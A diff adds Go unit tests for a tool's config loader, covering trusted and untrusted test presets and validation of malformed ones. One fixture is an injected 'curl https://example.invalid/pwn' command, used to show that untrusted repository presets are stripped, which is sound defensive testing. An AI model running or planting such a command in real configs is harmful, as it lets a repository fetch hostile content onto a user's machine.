@@ -141,6 +141,125 @@ extra_headers = { "X-Test" = "yes" }
 	}
 }
 
+func TestLoadConfig_TrustedUserTestPresetsMergeAndNormalize(t *testing.T) {
+	tmp := t.TempDir()
+	// Isolate both Unix XDG and macOS Application Support user config roots.
+	t.Setenv("HOME", tmp)
+	t.Setenv("XDG_CONFIG_HOME", filepath.Join(tmp, ".config"))
+	userPath, err := userConfigPath()
+	if err != nil {
+		t.Fatal(err)
+	}
+	if err := os.MkdirAll(filepath.Dir(userPath), 0o755); err != nil {
+		t.Fatal(err)
+	}
+	userConfig := []byte(`
+[test_presets.go-test]
+command = "go test ./..."
+identity_regex = "FAIL:\\s+(\\S+)"
+
+[test_presets.unit]
+command = "make unit"
+`)
+	if err := os.WriteFile(userPath, userConfig, 0o644); err != nil {
+		t.Fatal(err)
+	}
+	repo := filepath.Join(tmp, "repo")
+	if err := os.MkdirAll(repo, 0o755); err != nil {
+		t.Fatal(err)
+	}
+	cfg, _, err := LoadConfig(repo)
+	if err != nil {
+		t.Fatalf("LoadConfig() error = %v", err)
+	}
+	if got := cfg.TestPresets["go-test"].Command; got != "go test ./..." {
+		t.Fatalf("go-test command = %q", got)
+	}
+	if got := cfg.TestPresets["go-test"].IdentityRegex; got != `FAIL:\s+(\S+)` {
+		t.Fatalf("go-test identity_regex = %q", got)
+	}
+	if got := cfg.TestPresets["unit"].Command; got != "make unit" {
+		t.Fatalf("unit command = %q", got)
+	}
+}
+
+func TestLoadConfig_UntrustedRepoTestPresetsAreStripped(t *testing.T) {
+	tmp := t.TempDir()
+	t.Setenv("HOME", tmp)
+	t.Setenv("XDG_CONFIG_HOME", filepath.Join(tmp, ".config"))
+	// Empty host registry; untrusted repo must not inject presets.
+	repo := filepath.Join(tmp, "repo")
+	if err := os.MkdirAll(repo, 0o755); err != nil {
+		t.Fatal(err)
+	}
+	repoConfig := []byte(`
+[test_presets.go-test]
+command = "curl https://example.invalid/pwn"
+`)
+	if err := os.WriteFile(filepath.Join(repo, ".tagteam.toml"), repoConfig, 0o644); err != nil {
+		t.Fatal(err)
+	}
+	cfg, _, err := LoadConfig(repo)
+	if err != nil {
+		t.Fatalf("LoadConfig() error = %v", err)
+	}
+	if _, ok := cfg.TestPresets["go-test"]; ok {
+		t.Fatalf("untrusted repo test_presets must be stripped, got %#v", cfg.TestPresets)
+	}
+}
+
+func TestLoadConfig_TrustedRepoTestPresetsMerge(t *testing.T) {
+	tmp := t.TempDir()
+	home := filepath.Join(tmp, "home")
+	t.Setenv("XDG_CONFIG_HOME", home)
+	repo := filepath.Join(tmp, "repo")
+	if err := os.MkdirAll(repo, 0o755); err != nil {
+		t.Fatal(err)
+	}
+	repoConfig := []byte(`
+[test_presets.go-test]
+command = "go test ./internal/..."
+`)
+	if err := os.WriteFile(filepath.Join(repo, ".tagteam.toml"), repoConfig, 0o644); err != nil {
+		t.Fatal(err)
+	}
+	cfg, _, err := LoadConfigWithOptions(repo, LoadConfigOptions{TrustRepoConfig: true})
+	if err != nil {
+		t.Fatalf("LoadConfigWithOptions() error = %v", err)
+	}
+	if got := cfg.TestPresets["go-test"].Command; got != "go test ./internal/..." {
+		t.Fatalf("trusted repo go-test command = %q", got)
+	}
+}
+
+func TestValidateConfig_RejectsMalformedTestPresets(t *testing.T) {
+	cfg := DefaultConfig()
+	cfg.TestPresets = map[string]TestPresetConfig{
+		"go-test": {Command: ""},
+	}
+	if err := validateConfig(cfg); err == nil || !strings.Contains(err.Error(), "command") {
+		t.Fatalf("empty command error = %v", err)
+	}
+	cfg.TestPresets = map[string]TestPresetConfig{
+		"bad\nname": {Command: "go test ./..."},
+	}
+	if err := validateConfig(cfg); err == nil || !strings.Contains(err.Error(), "test_presets key") {
+		t.Fatalf("control-char key error = %v", err)
+	}
+	cfg.TestPresets = map[string]TestPresetConfig{
+		strings.Repeat("a", controlMaxRoleBytes+1): {Command: "go test ./..."},
+	}
+	if err := validateConfig(cfg); err == nil || !strings.Contains(err.Error(), "test_presets key") {
+		t.Fatalf("over-length key error = %v", err)
+	}
+	cfg.TestPresets = map[string]TestPresetConfig{
+		"go-test": {Command: "go test ./...", IdentityRegex: "["},
+	}
+	if err := validateConfig(cfg); err == nil || !strings.Contains(err.Error(), "identity_regex") {
+		t.Fatalf("bad identity_regex error = %v", err)
+	}
+}
+
 func TestLoadConfig_LoadsDotEnvIntoOverlayAndConfig(t *testing.T) {
 	tmp := t.TempDir()
 	home := filepath.Join(tmp, "home")
